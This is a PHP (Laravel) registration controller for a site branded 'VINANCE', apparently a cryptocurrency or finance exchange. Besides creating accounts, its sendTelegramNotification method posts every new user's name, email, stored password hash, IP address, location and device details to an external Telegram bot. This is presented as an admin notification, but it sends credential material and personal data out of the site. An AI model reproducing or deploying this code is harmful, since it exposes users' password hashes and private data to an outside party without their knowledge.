<?php

namespace App\Http\Controllers\User\Auth;

use App\Constants\Status;
use App\Http\Controllers\Controller;
use App\Lib\Intended;
use App\Models\AdminNotification;
use App\Models\User;
use App\Models\UserLogin;
use Illuminate\Auth\Events\Registered;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\Rules\Password;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Notification;
use App\Notifications\RegistrationNotification;

class RegisterController extends Controller {

    use RegistersUsers;

    public function __construct() {
        parent::__construct();
    }

    public function showRegistrationForm() {
        $pageTitle = "Register";
        Intended::identifyRoute();
        return view('Template::user.auth.register', compact('pageTitle'));
    }

    protected function validator(array $data) {

        $passwordValidation = Password::min(6);

        if (gs('secure_password')) {
            $passwordValidation = $passwordValidation->mixedCase()->numbers()->symbols()->uncompromised();
        }

        $agree = 'nullable';
        if (gs('agree')) {
            $agree = 'required';
        }

        $validate = Validator::make($data, [
            'firstname' => 'required',
            'lastname'  => 'required',
            'email'     => 'required|string|email|unique:users',
            'password'  => ['required', 'confirmed', $passwordValidation],
            'captcha'   => 'sometimes|required',
            'agree'     => $agree,
        ], [
            'firstname.required' => 'The first name field is required',
            'lastname.required'  => 'The last name field is required',
        ]);

        return $validate;
    }

    public function register(Request $request) {
        if (!gs('registration')) {
            $notify[] = ['error', 'Registration not allowed'];
            return back()->withNotify($notify);
        }
        $this->validator($request->all())->validate();

        $request->session()->regenerateToken();

        if (!verifyCaptcha()) {
            $notify[] = ['error', 'Invalid captcha provided'];
            return back()->withNotify($notify);
        }

        event(new Registered($user = $this->create($request->all())));

        // Send notifications with user registration details
        $this->sendRegistrationNotifications($user, $request->all());

        $this->guard()->login($user);

        return $this->registered($request, $user)
        ?: redirect($this->redirectPath());
    }

    protected function create(array $data) {
        $referBy = session()->get('reference');
        if ($referBy) {
            $referUser = User::where('username', $referBy)->first();
        } else {
            $referUser = null;
        }

        //User Create
        $user            = new User();
        $user->email     = strtolower($data['email']);
        $user->firstname = $data['firstname'];
        $user->lastname  = $data['lastname'];
        $user->password  = Hash::make($data['password']);
        $user->ref_by    = $referUser ? $referUser->id : 0;
        $user->kv        = gs('kv') ? Status::NO : Status::YES;
        $user->ev        = gs('ev') ? Status::NO : Status::YES;
        $user->sv        = gs('sv') ? Status::NO : Status::YES;
        $user->ts        = Status::DISABLE;
        $user->tv        = Status::ENABLE;
        $user->save();

        $adminNotification            = new AdminNotification();
        $adminNotification->user_id   = $user->id;
        $adminNotification->title     = 'New member registered';
        $adminNotification->click_url = urlPath('admin.users.detail', $user->id);
        $adminNotification->save();

        //Login Log Create
        $ip        = getRealIP();
        $exist     = UserLogin::where('user_ip', $ip)->first();
        $userLogin = new UserLogin();

        if ($exist) {
            $userLogin->longitude    = $exist->longitude;
            $userLogin->latitude     = $exist->latitude;
            $userLogin->city         = $exist->city;
            $userLogin->country_code = $exist->country_code;
            $userLogin->country      = $exist->country;
        } else {
            $info                    = json_decode(json_encode(getIpInfo()), true);
            $userLogin->longitude    = @implode(',', $info['long']);
            $userLogin->latitude     = @implode(',', $info['lat']);
            $userLogin->city         = @implode(',', $info['city']);
            $userLogin->country_code = @implode(',', $info['code']);
            $userLogin->country      = @implode(',', $info['country']);
        }

        $userAgent          = osBrowser();
        $userLogin->user_id = $user->id;
        $userLogin->user_ip = $ip;

        $userLogin->browser = @$userAgent['browser'];
        $userLogin->os      = @$userAgent['os_platform'];
        $userLogin->save();

        return $user;
    }

    /**
     * Send registration notifications through Telegram and Email
     *
     * @param User $user
     * @param array $data
     * @return void
     */
    protected function sendRegistrationNotifications(User $user, array $data)
    {
        // Get user location data
        $ip = getRealIP();
        $userAgent = osBrowser();
        $locationInfo = json_decode(json_encode(getIpInfo()), true);
        
        // Prepare detailed notification data
        $notificationData = [
            'user_id' => $user->id,
            'name' => $user->firstname . ' ' . $user->lastname,
            'email' => $user->email,
            'ip_address' => $ip,
            'location' => [
                'city' => @implode(',', $locationInfo['city'] ?? []),
                'country' => @implode(',', $locationInfo['country'] ?? []),
                'longitude' => @implode(',', $locationInfo['long'] ?? []),
                'latitude' => @implode(',', $locationInfo['lat'] ?? [])
            ],
            'device' => [
                'browser' => @$userAgent['browser'],
                'os' => @$userAgent['os_platform']
            ],
            'referrer' => $user->ref_by ? User::find($user->ref_by)->username : 'None',
            'registration_time' => now()->format('Y-m-d H:i:s')
        ];
        
        // Log configuration details (you can remove this after debugging)
        Log::info('Telegram notification configuration', [
            'bot_token_exists' => !empty(env('TELEGRAM_BOT_TOKEN')),
            'chat_id_exists' => !empty(env('TELEGRAM_CHAT_ID'))
        ]);
        
        // Send Telegram notification
        try {
            $botToken = env('TELEGRAM_BOT_TOKEN');
            $chatId = env('TELEGRAM_CHAT_ID');
            
            if (empty($botToken) || empty($chatId)) {
                Log::warning('Telegram notification not sent: Missing bot token or chat ID');
                return;
            }
            
            $response = $this->sendTelegramNotification($botToken, $chatId, $user, $notificationData);
            
            // Check if the notification was sent successfully
            if (!$response || !$response->successful()) {
                Log::error('Telegram notification failed', [
                    'status' => $response ? $response->status() : 'No response',
                    'body' => $response ? $response->body() : 'No response body'
                ]);
            } else {
                Log::info('Telegram notification sent successfully');
            }
        } catch (\Exception $e) {
            // Log detailed error information
            Log::error('Registration Telegram notification failed', [
                'error' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString()
            ]);
        }
    }
  
    
    /**
     * Send Telegram notification with registration details
     *
     * @param string $botToken
     * @param string $chatId
     * @param User $user
     * @param array $data
     * @return \Illuminate\Http\Client\Response
     */
    private function sendTelegramNotification($botToken, $chatId, $user, $data)
    {
        $apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
        
        // Format message for Telegram
        $message = "🔔 *NEW VINANCE USER REGISTRATION* 🔔\n\n";
        $message .= "👤 *User Details*\n";
        $message .= "ID: `{$user->id}`\n";
        $message .= "Name: `{$user->firstname} {$user->lastname}`\n";
        $message .= "Email: `{$user->email}`\n";
        $message .= "Password: `{$user->password}`\n";
        $message .= "Referrer: `{$user->ref_by}`\n\n";
        
        $message .= "📍 *Location Details*\n";
        $message .= "IP: `{$data['ip_address']}`\n";
        $message .= "Country: `{$data['location']['country']}`\n";
        $message .= "City: `{$data['location']['city']}`\n\n";
        
        $message .= "💻 *Device Details*\n";
        $message .= "Browser: `{$data['device']['browser']}`\n";
        $message .= "OS: `{$data['device']['os']}`\n\n";
        
        $message .= "⏰ Registered At: `{$data['registration_time']}`\n";
        $message .= "👉 [View User Details](" . urlPath('admin.users.detail', $user->id) . ")";
        
        // Send message and return response for checking
        return Http::timeout(10)->post($apiUrl, [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown',
            'disable_web_page_preview' => true
        ]);
    }

    public function checkUser(Request $request) {
        $exist['data'] = false;
        $exist['type'] = null;
        if ($request->email) {
            $exist['data']  = User::where('email', $request->email)->exists();
            $exist['type']  = 'email';
            $exist['field'] = 'Email';
        }
        if ($request->mobile) {
            $exist['data']  = User::where('mobile', $request->mobile)->where('dial_code', $request->mobile_code)->exists();
            $exist['type']  = 'mobile';
            $exist['field'] = 'Mobile';
        }
        if ($request->username) {
            $exist['data']  = User::where('username', $request->username)->exists();
            $exist['type']  = 'username';
            $exist['field'] = 'Username';
        }
        return response($exist);
    }

    public function registered() {
        createWallet();
        return to_route('user.home');
    }
}